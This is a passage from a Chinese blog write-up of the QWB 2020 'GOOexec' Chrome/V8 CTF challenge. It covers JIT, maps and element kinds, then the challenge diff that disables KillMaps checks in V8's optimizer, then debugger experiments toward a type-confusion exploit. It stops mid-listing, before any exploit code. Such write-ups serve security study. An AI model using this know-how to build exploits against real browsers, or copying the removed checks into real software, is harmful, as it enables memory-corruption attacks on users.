@@ -1,0 +1,543 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/ha1vk/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/ha1vk/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/ha1vk/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/ha1vk/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/ha1vk/css/main.css">
+
+
+<link rel="stylesheet" href="/ha1vk/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"github.com","root":"/ha1vk/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+  </script>
+
+  <meta name="description" content="文章首发于安全KER https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;224195 0x00 前言刚开始接触v8方面的漏洞利用，就从这题分享一下我学习的过程。 0x01 前置知识JIT">
+<meta property="og:type" content="article">
+<meta property="og:title" content="强网杯2020决赛RealWord的Chrome逃逸——GOOexec（GOO）">
+<meta property="og:url" content="https://github.com/ha1vk/2020/12/17/qwb2020-final-GOOexec/index.html">
+<meta property="og:site_name" content="ha1vk&#39;s blog">
+<meta property="og:description" content="文章首发于安全KER https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;224195 0x00 前言刚开始接触v8方面的漏洞利用，就从这题分享一下我学习的过程。 0x01 前置知识JIT">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://p3.ssl.qhimg.com/t0175e2f1a01ae0f8a7.png">
+<meta property="og:image" content="https://p2.ssl.qhimg.com/t01e6a462ba6340cf99.png">
+<meta property="og:image" content="https://p1.ssl.qhimg.com/t01c3ae783356c112c4.png">
+<meta property="og:image" content="https://p3.ssl.qhimg.com/t0153ed9e03c4e29128.png">
+<meta property="og:image" content="https://p3.ssl.qhimg.com/t01cb967de84df402c6.png">
+<meta property="article:published_time" content="2020-12-17T02:30:51.000Z">
+<meta property="article:modified_time" content="2025-06-26T09:14:41.003Z">
+<meta property="article:author" content="ha1vk">
+<meta property="article:tag" content="JS引擎漏洞">
+<meta property="article:tag" content="类型混淆">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://p3.ssl.qhimg.com/t0175e2f1a01ae0f8a7.png">
+
+<link rel="canonical" href="https://github.com/ha1vk/2020/12/17/qwb2020-final-GOOexec/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>强网杯2020决赛RealWord的Chrome逃逸——GOOexec（GOO） | ha1vk's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/ha1vk/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">ha1vk's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/ha1vk/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/ha1vk/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/ha1vk/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/ha1vk/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/ha1vk/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/ha1vk/2020/12/17/qwb2020-final-GOOexec/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/ha1vk/images/avatar.gif">
+      <meta itemprop="name" content="ha1vk">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ha1vk's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          强网杯2020决赛RealWord的Chrome逃逸——GOOexec（GOO）
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-12-17 10:30:51" itemprop="dateCreated datePublished" datetime="2020-12-17T10:30:51+08:00">2020-12-17</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-06-26 17:14:41" itemprop="dateModified" datetime="2025-06-26T17:14:41+08:00">2025-06-26</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/ha1vk/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/ha1vk/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/" itemprop="url" rel="index"><span itemprop="name">安全研究</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>文章首发于安全KER <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/224195">https://www.anquanke.com/post/id/224195</a></p>
+<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>刚开始接触v8方面的漏洞利用，就从这题分享一下我学习的过程。</p>
+<h2 id="0x01-前置知识"><a href="#0x01-前置知识" class="headerlink" title="0x01 前置知识"></a>0x01 前置知识</h2><h3 id="JIT"><a href="#JIT" class="headerlink" title="JIT"></a>JIT</h3><p>简单来说，JS引擎在解析javascript代码时，如果发现js里有段代码一直在做重复的类似操作，比如一个循环语句，且重复次数超过某个阈值，那么就会将这段JS代码翻译为本机的汇编代码，以提高代码的执行速度，这就叫JIT优化，如下的js代码可以触发v8的JIT优化</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for (var i=0;i&lt;0x20000;i++) &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>使用<code>./d8 1.js -print-opt-code</code>，可以查看JIT代码<br><img src="https://p3.ssl.qhimg.com/t0175e2f1a01ae0f8a7.png"></p>
+<h3 id="MAP"><a href="#MAP" class="headerlink" title="MAP"></a>MAP</h3><p>map是一个对象，在v8里，每一个js对象内部都有一个map对象指针，v8通过map的值来判断这个js对象到底是哪种类型。</p>
+<h3 id="类型混淆（Type-Confusion）"><a href="#类型混淆（Type-Confusion）" class="headerlink" title="类型混淆（Type Confusion）"></a>类型混淆（Type Confusion）</h3><p>如果map的类型发生错误，将会发生类型混淆，比如原本一个存double数值的数组对象，map变成了对象数组的类型，那么再次访问其元素时，取出的不再是一个double值，而是该double值作为地址指向的对象。因此可以用来伪造对象，只需伪造一个ArrayBuffer对象，即可实现任意地址读写。类型混淆往往跟JIT编译后的代码有关，某些情况下JIT即时编译的代码里的判断条件可能考虑的不充分便会发生类型混淆。</p>
+<h3 id="V8的数组"><a href="#V8的数组" class="headerlink" title="V8的数组"></a>V8的数组</h3><p>V8的数组是一个对象，其条目仍然是一个对象，数据存在条目对象的里，如果是<code>DOUBLE_ELEMENTS</code>类型，则element对象的数据区直接保存这个double值(64位)，如果是其他类型，则将数据包装为一个对象，element对象的数据区将保存这个对象的地址。<br>element的类型当中，以<code>PACKED</code>开头的代表这是一个<code>密集型数组(快数组)</code>；以<code>HOLEY</code>开头的数组为<code>稀疏数组(慢数组)</code><br><img src="https://p2.ssl.qhimg.com/t01e6a462ba6340cf99.png"><br>数组常见的几种element类型变化情况如下，类型变化只能沿着箭头方向进行，一旦从一种类型变为另一种类型，就不能再逆回去了。<br><img src="https://p1.ssl.qhimg.com/t01c3ae783356c112c4.png"></p>
+<h4 id="Array-0-和new-Array-0-和-的区别"><a href="#Array-0-和new-Array-0-和-的区别" class="headerlink" title="Array(0)和new Array(0)和[]的区别"></a>Array(0)和new Array(0)和[]的区别</h4><p>使用如下代码测试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var a = Array(0);</span><br><span class="line">%DebugPrint(a);</span><br><span class="line">var b = new Array(0);</span><br><span class="line">%DebugPrint(b);</span><br><span class="line">var c = [];</span><br><span class="line">%DebugPrint(c);</span><br></pre></td></tr></table></figure>
+<p>测试结果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">Array(0): 0x15ed08148565: [JSArray]</span><br><span class="line"> - map: 0x15ed083038d5 &lt;Map(HOLEY_SMI_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x15ed082cb529 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x15ed080426dd &lt;FixedArray[0]&gt; [HOLEY_SMI_ELEMENTS]</span><br><span class="line"> - length: 0</span><br><span class="line"> - properties: 0x15ed080426dd &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    0x15ed08044649: [String] in ReadOnlySpace: #length: 0x15ed08242159 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">new Array(0): 0x15ed08148575: [JSArray]</span><br><span class="line"> - map: 0x15ed083038d5 &lt;Map(HOLEY_SMI_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x15ed082cb529 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x15ed080426dd &lt;FixedArray[0]&gt; [HOLEY_SMI_ELEMENTS]</span><br><span class="line"> - length: 0</span><br><span class="line"> - properties: 0x15ed080426dd &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    0x15ed08044649: [String] in ReadOnlySpace: #length: 0x15ed08242159 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">[]: 0x15ed08148585: [JSArray]</span><br><span class="line"> - map: 0x15ed0830385d &lt;Map(PACKED_SMI_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x15ed082cb529 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x15ed080426dd &lt;FixedArray[0]&gt; [PACKED_SMI_ELEMENTS]</span><br><span class="line"> - length: 0</span><br><span class="line"> - properties: 0x15ed080426dd &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    0x15ed08044649: [String] in ReadOnlySpace: #length: 0x15ed08242159 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+<p>我们看到，Array(0)和new Array(0)产生的对象在<code>不考虑JIT的情况下</code>是一样的，而[]类型为PACKED_SMI_ELEMENTS，如果考虑了JIT，那么情况会变得复杂，稍后的题中将遇到这种情况。</p>
+<h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><h3 id="切入点"><a href="#切入点" class="headerlink" title="切入点"></a>切入点</h3><p>题目给了我们一个diff文件，以及经过patch后编译的chrome浏览器和v8引擎。其中diff文件如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/src/compiler/load-elimination.cc b/src/compiler/load-elimination.cc</span><br><span class="line">index ff79da8c86..8effdd6e15 100644</span><br><span class="line">--- a/src/compiler/load-elimination.cc</span><br><span class="line">+++ b/src/compiler/load-elimination.cc</span><br><span class="line">@@ -866,8 +866,8 @@ Reduction LoadElimination::ReduceTransitionElementsKind(Node* node) &#123;</span><br><span class="line">     if (object_maps.contains(ZoneHandleSet&lt;Map&gt;(source_map))) &#123;</span><br><span class="line">       object_maps.remove(source_map, zone());</span><br><span class="line">       object_maps.insert(target_map, zone());</span><br><span class="line">-      AliasStateInfo alias_info(state, object, source_map);</span><br><span class="line">-      state = state-&gt;KillMaps(alias_info, zone());</span><br><span class="line">+      // AliasStateInfo alias_info(state, object, source_map);</span><br><span class="line">+      // state = state-&gt;KillMaps(alias_info, zone());</span><br><span class="line">       state = state-&gt;SetMaps(object, object_maps, zone());</span><br><span class="line">     &#125;</span><br><span class="line">   &#125; else &#123;</span><br><span class="line">@@ -892,7 +892,7 @@ Reduction LoadElimination::ReduceTransitionAndStoreElement(Node* node) &#123;</span><br><span class="line">   if (state-&gt;LookupMaps(object, &amp;object_maps)) &#123;</span><br><span class="line">     object_maps.insert(double_map, zone());</span><br><span class="line">     object_maps.insert(fast_map, zone());</span><br><span class="line">-    state = state-&gt;KillMaps(object, zone());</span><br><span class="line">+    // state = state-&gt;KillMaps(object, zone());</span><br><span class="line">     state = state-&gt;SetMaps(object, object_maps, zone());</span><br><span class="line">   &#125;</span><br><span class="line">   // Kill the elements as well.</span><br></pre></td></tr></table></figure>
+<p>首先，patch点出现在<code>ReduceTransitionElementsKind</code>和<code>ReduceTransitionAndStoreElement</code>函数中，从源文件路径知道这个类跟JIT编译器有关，在某些情况下会影响到编译出的代码。经过个人的研究，发现 <code>ReduceTransitionElementsKind</code>的作用是为了加快<code>elements</code>的类型转换，如果在一段会被JIT优化的js代码段中对数组的element进行类型转换操作，就会调用这个函数来构建相关的汇编代码。</p>
+<h3 id="小实验"><a href="#小实验" class="headerlink" title="小实验"></a>小实验</h3><p>首先<code>b ReduceTransitionElementsKind</code>和<code>bReduceTransitionAndStoreElement</code>设置断点，运行如下的测试代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var a;</span><br><span class="line">for (var i=0;i&lt;0x2000;i++) &#123;</span><br><span class="line">   a = Array(0);</span><br><span class="line">   a[0] = 1.1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>发现确实能够断下来，我们再试试这两段代码，发现都不能下断</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var a;</span><br><span class="line">for (var i=0;i&lt;0x2000;i++) &#123;</span><br><span class="line">   a = new Array(0);</span><br><span class="line">   a[0] = 1.1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var a;</span><br><span class="line">for (var i=0;i&lt;0x20000;i++) &#123;</span><br><span class="line">   a = [];</span><br><span class="line">   a[0] = 1.1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>为了解释其中的原因，我们查看一下JIT的汇编代码（截取部分）<br>第一段js代码的JIT汇编中，Array(0)的创建过程</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">0x33ea00084f47    87  49b8e80d0beb79550000 REX.W movq r8,0x5579eb0b0de8    ;; external reference (Heap::NewSpaceAllocationTopAddress())</span><br><span class="line">0x33ea00084f51    91  4d8b08         REX.W movq r9,[r8]</span><br><span class="line">0x33ea00084f54    94  4d8d5910       REX.W leaq r11,[r9+0x10]</span><br><span class="line">0x33ea00084f58    98  49bcf00d0beb79550000 REX.W movq r12,0x5579eb0b0df0    ;; external reference (Heap::NewSpaceAllocationLimitAddress())</span><br><span class="line">0x33ea00084f62    a2  4d391c24       REX.W cmpq [r12],r11</span><br><span class="line">0x33ea00084f66    a6  0f8606020000   jna 0x33ea00085172  &lt;+0x2b2&gt;</span><br><span class="line">0x33ea00084f6c    ac  4d8d5910       REX.W leaq r11,[r9+0x10]</span><br><span class="line">0x33ea00084f70    b0  4d8918         REX.W movq [r8],r11</span><br><span class="line">0x33ea00084f73    b3  4983c101       REX.W addq r9,0x1</span><br><span class="line">0x33ea00084f77    b7  41bb5d383008   movl r11,0x830385d      ;; (compressed) object: 0x33ea0830385d &lt;Map(PACKED_SMI_ELEMENTS)&gt;</span><br><span class="line">0x33ea00084f7d    bd  458959ff       movl [r9-0x1],r11</span><br><span class="line">0x33ea00084f81    c1  4d8bb550010000 REX.W movq r14,[r13+0x150] (root (empty_fixed_array))</span><br><span class="line">0x33ea00084f88    c8  45897103       movl [r9+0x3],r14</span><br><span class="line">0x33ea00084f8c    cc  45897107       movl [r9+0x7],r14</span><br><span class="line">0x33ea00084f90    d0  41c7410b00000000 movl [r9+0xb],0x0</span><br><span class="line">0x33ea00084f98    d8  49bf89252d08ea330000 REX.W movq r15,0x33ea082d2589    ;; object: 0x33ea082d2589 &lt;PropertyCell name=0x33ea080c91a9 &lt;String[1]: #a&gt; value=0x33ea08383dd5 &lt;JSArray[1]&gt;&gt;</span><br><span class="line">0x33ea00084fa2    e2  45894f0b       movl [r15+0xb],r9</span><br></pre></td></tr></table></figure>
+<p>可以看到，在这里，Array(0)初始为了<code>PACKED_SMI_ELEMENTS</code>类型的数组，因此对其条目赋予double值时，会发生类型转换。<br>接下来，我们看第二段js代码的JIT代码中创建new Array(0)的部分</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">0x57300084f47    87  49b8e83d22e5f8550000 REX.W movq r8,0x55f8e5223de8    ;; external reference (Heap::NewSpaceAllocationTopAddress())</span><br><span class="line">0x57300084f51    91  4d8b08         REX.W movq r9,[r8]</span><br><span class="line">0x57300084f54    94  4d8d5910       REX.W leaq r11,[r9+0x10]</span><br><span class="line">0x57300084f58    98  49bcf03d22e5f8550000 REX.W movq r12,0x55f8e5223df0    ;; external reference (Heap::NewSpaceAllocationLimitAddress())</span><br><span class="line">0x57300084f62    a2  4d391c24       REX.W cmpq [r12],r11</span><br><span class="line">0x57300084f66    a6  0f86b5010000   jna 0x57300085121  &lt;+0x261&gt;</span><br><span class="line">0x57300084f6c    ac  4d8d5910       REX.W leaq r11,[r9+0x10]</span><br><span class="line">0x57300084f70    b0  4d8918         REX.W movq [r8],r11</span><br><span class="line">0x57300084f73    b3  4983c101       REX.W addq r9,0x1</span><br><span class="line">0x57300084f77    b7  41bb25393008   movl r11,0x8303925       ;; (compressed) object: 0x057308303925 &lt;Map(HOLEY_DOUBLE_ELEMENTS)&gt;</span><br><span class="line">0x57300084f7d    bd  458959ff       movl [r9-0x1],r11</span><br><span class="line">0x57300084f81    c1  4d8bb550010000 REX.W movq r14,[r13+0x150] (root (empty_fixed_array))</span><br><span class="line">0x57300084f88    c8  45897103       movl [r9+0x3],r14</span><br><span class="line">0x57300084f8c    cc  45897107       movl [r9+0x7],r14</span><br><span class="line">0x57300084f90    d0  41c7410b00000000 movl [r9+0xb],0x0</span><br><span class="line">0x57300084f98    d8  49bf8d252d0873050000 REX.W movq r15,0x573082d258d    ;; object: 0x0573082d258d &lt;PropertyCell name=0x0573080c91a9 &lt;String[1]: #a&gt; value=0x057308373935 &lt;JSArray[1]&gt;&gt;</span><br></pre></td></tr></table></figure>
+<p>可以看到，new Array(0)一开始就是<code>HOLEY_DOUBLE_ELEMENTS</code>类型，可以满足a[0] &#x3D; 1.1的操作，不需要再做类型转换。<br>接下来，我们看第三段js代码的JIT代码中创建[]的部分，发现[]一开始就是<code>PACKED_DOUBLE_ELEMENTS</code>类型，可以满足a[0] &#x3D; 1.1的操作，不需要再做类型转换。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">0x30bd00084f47    87  49b8e80d40d4c6550000 REX.W movq r8,0x55c6d4400de8    ;; external reference (Heap::NewSpaceAllocationTopAddress())</span><br><span class="line">0x30bd00084f51    91  4d8b08         REX.W movq r9,[r8]</span><br><span class="line">0x30bd00084f54    94  4d8d5910       REX.W leaq r11,[r9+0x10]</span><br><span class="line">0x30bd00084f58    98  49bcf00d40d4c6550000 REX.W movq r12,0x55c6d4400df0    ;; external reference (Heap::NewSpaceAllocationLimitAddress())</span><br><span class="line">0x30bd00084f62    a2  4d391c24       REX.W cmpq [r12],r11</span><br><span class="line">0x30bd00084f66    a6  0f8695010000   jna 0x30bd00085101  &lt;+0x241&gt;</span><br><span class="line">0x30bd00084f6c    ac  4d8d5910       REX.W leaq r11,[r9+0x10]</span><br><span class="line">0x30bd00084f70    b0  4d8918         REX.W movq [r8],r11</span><br><span class="line">0x30bd00084f73    b3  4983c101       REX.W addq r9,0x1</span><br><span class="line">0x30bd00084f77    b7  41bbfd383008   movl r11,0x83038fd      ;; (compressed) object: 0x30bd083038fd &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt;</span><br><span class="line">0x30bd00084f7d    bd  458959ff       movl [r9-0x1],r11</span><br><span class="line">0x30bd00084f81    c1  4d8bb550010000 REX.W movq r14,[r13+0x150] (root (empty_fixed_array))</span><br><span class="line">0x30bd00084f88    c8  45897103       movl [r9+0x3],r14</span><br><span class="line">0x30bd00084f8c    cc  45897107       movl [r9+0x7],r14</span><br><span class="line">0x30bd00084f90    d0  41c7410b00000000 movl [r9+0xb],0x0</span><br><span class="line">0x30bd00084f98    d8  49bf81252d08bd300000 REX.W movq r15,0x30bd082d2581    ;; object: 0x30bd082d2581 &lt;PropertyCell name=0x30bd080c91a9 &lt;String[1]: #a&gt; value=0x30bd083c4e5d &lt;JSArray[1]&gt;&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h4><p>从上面的实验来看，数组的elements类型在JIT下和普通js下是不一样的，JIT会对其进行优化。其中如果是<code>new Array(0)</code>和<code>[]</code>创建的数组，那么其数组的elements初始时的类型就已经是目标数据的类型了。因此就不需要再调用<code>ReduceTransitionElementsKind</code>和<code>ReduceTransitionAndStoreElement</code>进行类型转换。因此在利用中，我们应该使用Array(0)的方式来创建数组。</p>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>patch了<code>AliasStateInfo alias_info(state, object, source_map);</code>和<code>state = state-&gt;KillMaps(object, zone());</code>，我们先来看看<code>KillMaps</code>的源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">LoadElimination::AbstractState const* LoadElimination::AbstractState::KillMaps(</span><br><span class="line">    const AliasStateInfo&amp; alias_info, Zone* zone) const &#123;</span><br><span class="line">  if (this-&gt;maps_) &#123;</span><br><span class="line">    AbstractMaps const* that_maps = this-&gt;maps_-&gt;Kill(alias_info, zone);</span><br><span class="line">    if (this-&gt;maps_ != that_maps) &#123;</span><br><span class="line">      AbstractState* that = new (zone) AbstractState(*this);</span><br><span class="line">      that-&gt;maps_ = that_maps;</span><br><span class="line">      return that;</span><br><span class="line">    &#125;</span><br><span class="line">  